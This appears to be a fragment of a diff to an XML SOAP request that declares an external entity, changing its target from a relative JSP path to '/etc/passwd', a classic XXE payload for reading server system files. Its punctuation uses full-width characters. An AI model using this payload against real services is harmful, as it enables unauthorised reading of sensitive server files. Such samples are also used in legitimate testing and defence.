@@ -1,7 +1,7 @@
 <？xml version = "1.0"？> 
 <！DOCTYPE order [ 
   <！ELEMENT foo ANY> 
-  <！ENTITY xxe SYSTEM "../xsl_list.jsp">
+  <！ENTITY xxe SYSTEM "/etc/passwd">
 ]>
  <soap：Envelope  xmlns：soap = "http://www.w3.org/2001/12/soap-envelope"  soap：encodingStyle = "http://www.w3.org/2001/12/soap-encoding" > 
   <soap：Body  xmlns：m = "http://www.example.org/order" > 
